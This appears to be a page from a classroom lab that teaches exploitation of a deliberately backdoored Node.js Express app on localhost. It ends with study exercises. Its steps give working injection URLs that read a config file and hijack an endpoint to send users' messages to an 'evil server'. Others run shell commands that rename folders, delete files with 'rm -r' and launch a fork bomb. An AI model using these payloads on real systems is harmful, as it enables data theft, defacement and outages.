<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Leave Me Here</title>
  <link href="https://fonts.googleapis.com/css?family=Play" rel="stylesheet">
  <link rel="stylesheet" href="\css\styles.css">
</head>

<body>
<div class='header'>
  <div id='logo'>
  <h1>Leave Me Here</h1>
  <h3>A NODE.JS Application Backdoor</h3>
</div>
  <ul id='menu'>
      <li><a href='/'>HOME</a></li>
      <li><a href='vulns'>VULNS</a></li>
      <li><a href='exploit' class='currPage'>XPLOIT</a></li>
      <li><a href='about'>ABOUT</a></li>
  </ul>
  </div>

<div id='wrapper'>
  <div id='contentDiv'>
      <h2>Let's Hack it</h2>
      <p>Lets put the backdoor to work. We are gonna make a call to the endpoint with eval() and send a line of code with res.sendFile().  Keep in mind that we removed the original res.send() This line will replace the actual response from the endpoint. We are going to request the database config file. If you are the one who setup the App, most likely, you already have this data. Lets us pretend the owner changed this config or that we are pulling some other key or log file. This is realistic since the database config folder is usually in the same directory as the App</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/TV0fKRoS3v?Rdzmu3mpFH=res.sendFile('database.js',{root:'\scripts'});</p>
      </div>
      <h2>Express Extraction/Injection</h2>
      <p>Most developers are familiar with the concept of SQL injection but in this case we are going to try something rather odd. We are going to modify an Express endpoint by injecting new instructions based in the Express App itself. At top of the index.js you can see 'var app = express();' We are going to reference app and retreive data about the endpoint routes. Specifically about the /dataSend endpoint.</p>
      <p>you must TURN ON THE EVIL SERVER in order to run the following exploit steps.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/dataSend?Rdzmu3mpFH=res.write(JSON.stringify(app._router.stack));res.end();</p>
      </div>
      <p>That huge object we got as response is the entire stack of routes that were instantiated when the Node App started. We are not gonna use it this time but you can see the potential in changing elements around. Now we are going to inject a data forward exploit in our vulnerable /dataSend endpoint. First step is to save the original code. Make sure to do this IN ORDER and ONLY ONE TIME otherwise you will create a recursion.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/dataSend?Rdzmu3mpFH=original=arguments[0].route.stack[0].handle;</p>
      </div>
      <p>Now that we saved the original code we are going to inject a GET request. MAKE SURE to have the evil server running. If it is not, then the GET will fail and the server will crash instantly because of unhandled exception. You may be actually looking to crash the server, but be really careful that it doesn't happen by accident. After sending the data to our server, we must call the original function in order to keep the functionality of the endpoint.
        </p>
      <p>Steal some data</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/dataSend?Rdzmu3mpFH=arguments[0].route.stack[0].handle=function(req,res,next)</p>
          <p class='tabbedNone'>{http.get({host:%27localhost%27,path:%27/?msg=%27%2Breq.query.msg%2B%27%26user=%27%2Breq.query.user,port:3030},</p><p class='tabbedNone'>function(res){next();});original(req,res,next)}</p>
      </div>
      <p>Now its time to test our hacked endpoint. Up until now your evil server should not be receiving anything. Make some innocent calls to the /sendData endpoint and send user and message in the parameters. They should be forwarded to the evil server. The messages should appear in both consoles.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/dataSend?user=joeBlow&msg=secretImportantMesage</p>
      </div>
      <p>Close the Backdoor</p>
      <p>Now that we have succesfully exfiltrated data from the server, its time to close the backdoor. That is, set the endpoint back to normal. Inject the following code and then send more messages to the /dataSend endpoint. The evil server should not be getting anything anymore.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/dataSend?Rdzmu3mpFH=arguments[0].route.stack[0].handle=original;</p>
      </div>
      <img src='\images\leaveme.png'>
      <h2>Deface It</h2>
      <p>Now we are going to change the look of the interface. Defacing is a common goal among website hackers. If we had dynamic pages we could easily change the text and other visual elements by going after the variables that define them. Since we have static pages, we are going for something simpler. We are going to invoke a shell command and rename the images folder.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/5JITcyICH3?HnlmB9RIgC=rename images ima</p>
      </div>
      <h2>Break It</h2>
      <p>If you are linux you may try the following and try to break the even more. We will try some dangerous commands including a fork bomb. If you are in windows you can still try to delete some files.</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/5JITcyICH3?HnlmB9RIgC=rm -r</p>
      </div>
       <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/5JITcyICH3?HnlmB9RIgC=:(){:|:&};:</p>
      </div>
      <h2>Kill It!</h2>
      <p>Now its time to terminate the application. We will simply inject the command process.exit() in order to gracefully terminate the node server process. This one is sure to work since the process does not need elevated permisions to terminate itself.</p>
      <p>Goodbye!</p>
      <div class='codeBox'>
          <p class='tabbedNone'>http://localhost:3000/TV0fKRoS3v?Rdzmu3mpFH=process.exit();</p>
      </div>
      <h2>Exercises</h2>
    <ul>
        <li>Go to a JSON-pretty website and paste the route stack object. Can you find the request type for each endpoint?</li>
        <li>Try to inject code that changes the request type of the /about endpoint, so you make it fail.</li>
        <li>Why did we have to create the 'original' variable? what is the scope of it?</li>
        <li>After running the 'defacing' hack this site can no longer show images. Can you fix it back?</li>
        <li>Look at the source code files. Did they get succesfully deleted/renamed ? If not can you find a way to do it?</li>
        <li>For more research, look up fork bomb. How does it work ?</li>
    </ul>
  </div>
  <div id='columnDiv'>
    <div id='panel'>
      <h2>all javascript client api network browser server framework web module parser http nodejs implementation test css json file express data tool vulns testing coffeescript object database html based middleware wrapper command connect template easy language files asynchronous async build code fast stream exploits mongodb utility generator compiler rest system applications jquery templates dom support lightweight objects tools bind</h2>
    </div>
  </div>
</div>    
<div id='footer'><h4>@fall2017 by juliosotodev</h4></div>    
</body>
</html>